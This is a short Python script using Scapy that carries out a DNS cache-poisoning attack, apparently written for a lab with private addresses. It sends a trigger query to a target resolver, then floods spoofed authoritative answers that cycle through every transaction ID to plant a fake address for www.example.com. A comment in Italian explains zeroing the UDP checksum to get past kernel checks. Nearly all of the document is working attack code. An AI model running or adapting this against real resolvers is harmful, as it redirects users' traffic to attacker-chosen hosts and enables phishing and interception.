from scapy.all import *
import struct
import socket

target_dns = "10.9.0.53"
auth_dns = "10.9.0.153"
domain = "www.example.com"
fake_ip = "6.6.6.6" 
target_port = 33333 

print("[*] 1. Sending trigger query to local-dns...")
trigger = IP(dst=target_dns)/UDP(dport=53)/DNS(rd=1, qd=DNSQR(qname=domain))
send(trigger, verbose=0)

print("[*] 2. Flooding spoofed responses to win the race condition...")
# AGGIUNTA CRITICA: chksum=0 per bypassare il controllo del kernel
base_pkt = (
    IP(src=auth_dns, dst=target_dns) /
    UDP(sport=53, dport=target_port, chksum=0) /
    DNS(id=0, qr=1, aa=1, qd=DNSQR(qname=domain), 
        an=DNSRR(rrname=domain, type='A', ttl=86400, rdata=fake_ip))
)

raw_bytes = bytearray(raw(base_pkt))
s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)

for txid in range(0, 65535):
    struct.pack_into('!H', raw_bytes, 28, txid)
    s.sendto(raw_bytes, (target_dns, 0))

print("[+] Flood complete! Check the cache.")
